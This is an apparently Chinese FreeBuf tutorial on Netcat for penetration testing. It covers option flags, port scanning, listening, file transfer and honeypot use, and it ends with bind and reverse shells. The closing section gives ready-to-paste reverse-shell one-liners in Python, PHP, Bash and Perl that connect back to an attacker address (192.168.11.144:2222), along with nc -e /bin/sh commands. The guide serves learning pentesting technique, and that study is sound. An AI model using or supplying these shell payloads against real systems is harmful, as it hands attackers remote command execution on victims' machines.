##
![带你领略传说中的“瑞士军刀”——Netcat](https://image.3001.net/images/20180415/15237609545083.png!small)  

## 前言

**最近在做渗透测试的时候遇到了端口监听和shell的反弹问题，在这个过程中自己对Netcat这一款神器有了新的认识，现将一些Netcat的用法做一个小总结，希望对各位有帮助！**

## Netcat简介

Netcat是一款非常出名的网络工具，简称“NC”,有渗透测试中的“瑞士军刀”之称。它可以用作端口监听、端口扫描、远程文件传输、还可以实现远程shell等功能。总之功能强大，可以用一句较为风趣的话来描述NC的强大——“你的想象力是局限NC的瓶颈”。

## Netcat选项参数说明

![最近在做渗透测试的时候遇到了端口监听和shell的反弹问题，在这个过程中自己对Netcat这一款神器有了新的认识，现将一些Netcat的用法做一个小总结，希望对各位有帮助！](https://image.3001.net/images/20180415/15237631789817.png!small)  

**功能说明：** 端口扫描、端口监听、远程文件传输、远程shell等等;

 **语 法：** nc
[-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>][-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]

 **参 数：**

> -g <网关> 设置路由器跃程通信网关，最多可设置8个；
>
> -G <指向器数目> 设置来源路由指向器，其数值为4的倍数；
>
> -h 在线帮助；
>
> -i <延迟秒数> 设置时间间隔，以便传送信息及扫描通信端口；
>
> -l 使用监听模式，管控传入的资料；
>
> -n 直接使用IP地址，而不通过域名服务器；
>
> -o <输出文件> 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
>
> -p <通信端口> 设置本地主机使用的通信端口；
>
> -r 乱数指定本地与远端主机的通信端口；
>
> -s <来源位址> 设置本地主机送出数据包的IP地址；
>
> -u 使用UDP传输协议；
>
> -v 显示指令执行过程；
>
> -w <超时秒数> 设置等待连线的时间；
>
> -z 使用0输入/输出模式，只在扫描通信端口时使用。

## Netcat简易使用

### 连接到远程主机

    
    
    命令：nc  -nvv Targert_IP  Targert_Port

![连接到远程主机](https://image.3001.net/images/20180415/15237810217909.png!small)  

### 监听本地主机

    
    
    命令：nc  -l  -p  Local_Port

![监听本地主机](https://image.3001.net/images/20180415/1523781066846.png!small)  

### 端口扫描

扫描指定主机的单一端口是否开放

    
    
    格式：nc  -v  target_IP  target_Port

![端口扫描](https://image.3001.net/images/20180415/15237731027814.png!small)  

扫描指定主机的某个端口段的端口开放信息

    
    
    格式：nc  -v  -z  Target_IP   Target_Port_Start  -  Target_Port_End

![端口扫描](https://image.3001.net/images/20180415/15237731832501.png!small)  

扫描指定主机的某个UDP端口段，并且返回端口信息

    
    
    格式：nc -v   -z  -u  Target_IP  Target_Port_Start   -   Target_Port_End

![端口扫描](https://image.3001.net/images/20180415/15237734291499.png!small)  

扫描指定主机的端口段信息，并且设置超时时间为3秒

    
    
    格式：nc  -vv（-v） -z  -w  time  Target_IP   Target_Port_Start-Targert_Port_End

![端口扫描](https://image.3001.net/images/20180415/15237737676600.png!small)  

### 端口监听

监听本地端口

    
    
    格式：nc  -l  -p  local_Port

![端口监听](https://image.3001.net/images/20180415/15237743797102.png!small)  

![端口监听](https://image.3001.net/images/20180415/15237743716515.png!small)  

![端口监听](https://image.3001.net/images/20180415/15237743957730.png!small)  

**_注：先设置监听（不能出现端口冲突），之后如果有外来访问则输出该详细信息到命令行_**

监听本地端口，并且将监听到的信息保存到指定的文件中

    
    
    格式：nc -l  -p local_Port > target_File

![端口监听](https://image.3001.net/images/20180415/15237745909417.png!small)  

![端口监听](https://image.3001.net/images/20180415/15237745988144.png!small)  

![端口监听](https://image.3001.net/images/20180415/1523774621285.png!small)  

### 连接远程系统

    
    
    格式：nc Target_IP  Target_Port

![连接远程系统](https://image.3001.net/images/20180415/1523775746383.png!small)  

之后可以运行HTTP请求

![连接远程系统](https://image.3001.net/images/20180415/15237785068217.png!small)  

### FTP匿名探测

    
    
    格式：nc Targert_IP  21

![连接远程系统](https://image.3001.net/images/20180415/15237774836377.png!small)  

文件传输  

传输端：

    
    
    格式：nc  Targert_IP  Targert_Port  <  Targert_File

![连接远程系统](https://image.3001.net/images/20180415/15237801293390.png!small)  

![连接远程系统](https://image.3001.net/images/20180415/15237801463466.png!small)  

接收端：

    
    
    格式：nc   -l  Local_Port  >  Targert_File

![连接远程系统](https://image.3001.net/images/20180415/1523780161714.png!small)  

![连接远程系统](https://image.3001.net/images/20180415/15237801756851.png!small)  

###  **简易聊天**

本地主机

命令：nc -l 8888

![简易聊天](https://image.3001.net/images/20180415/15237804388138.png!small)  

远程主机

命令：nc Targert_IP Targert_Port

![简易聊天](https://image.3001.net/images/20180415/15237804302203.png!small)  

### 蜜罐

 **作为蜜罐使用1：**

命令：nc -L -p Port

注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止

 **作为蜜罐使用2：**

命令：nc -L -p Port >log.txt

 **注：**
使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止，同时把结果输出到log.txt文件中，如果把“>”改为“>>”即追加到文件之后。

这一个命令参数“-L”在Windows中有，现在的Linux中是没有这个选项的，但是自己可以去找找，这里只是想到了之前的这个使用，所以提出来简单介绍一下！

### 获取shell

简述：获取shell分为两种，一种是正向shell，一种是方向shell。如果客户端连接服务器端，想要获取服务器端的shell，那么称为正向shell，如果是客户端连接服务器，服务器端想要获取客户端的shell，那么称为反向shell

 **正向shell**

 **本地主机：**

命令：nc Targert_IP Targert_Port

![本地主机](https://image.3001.net/images/20180415/1523783797627.png!small)  

**目标主机：**

命令：nc -lvp Targert_Port -e /bin/sh

![目标主机](https://image.3001.net/images/20180415/15237838137473.png!small)  

## 反向shell

本地主机：

命令： nc -lvp Target_Port

![本地主机](https://image.3001.net/images/20180415/15237842362478.png!small)  

目标主机：

命令： nc Targert_IP Targert_Port -e /bin/sh

![目标主机](https://image.3001.net/images/20180415/15237842932087.png!small)

### 特殊情况——目标主机上没有Netcat，如何获取反向shell

在一般情况下，目标主机上一般都是不会有Netcat的，此时就需要使用其他替代的方法来实现反向链接达到攻击主机的目的，下面简单的介绍几种反向shell的设置。

 **python反向shell**

目标主机端执行语句：

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.144",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

本地主机

![本地主机](https://image.3001.net/images/20180415/15237917421331.png!small)  

目标主机

![目标主机](https://image.3001.net/images/20180415/15237917644515.png!small)  

 **PHP反向shell**

目标主机端执行语句：  

    
    
    php -r '$sock=fsockopen("192.168.11.144",2222);exec("/bin/sh -i <&3 >&3 2>&3");'

本地主机：

![本地主机](https://image.3001.net/images/20180415/15237915077315.png!small)  

目标主机：

![目标主机](https://image.3001.net/images/20180415/15237914595773.png!small)  

 **Bash反向shell**

目标主机端执行语句：  

    
    
    bash -i>＆/dev/tcp/192.168.11.144/2222 0>＆1

本地主机：

![本地主机](https://image.3001.net/images/20180415/15237907578683.png!small)  

目标主机：

![目标主机](https://image.3001.net/images/20180415/15237907722944.png!small)  

 **Perl反向shell**

目标主机端执行语句：  

    
    
    perl -e 'use Socket;$i="192.168.11.144";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

本地主机

![本地主机](https://image.3001.net/images/20180415/15237912521506.png!small)  

目标主机

![目标主机](https://image.3001.net/images/20180415/15237912635253.png!small)

 **注:书写的时候一定要注意这里单引号、双引号是英文格式的，不然会报错误！**

**总结：有一句话为“温故而知新”，同时又有一句话为“实践出真知”，当这两句话同时践行的时候，就会擦出不一样的火花，你会看到你之前未见到的，掌握到你之前生疏的技能！Netcat固然好用，但是也要经过实践才知道，那你还在等什么呢？**

 ***本文作者：Fly鹏程万里，转载请注明来自 FreeBuf.COM**

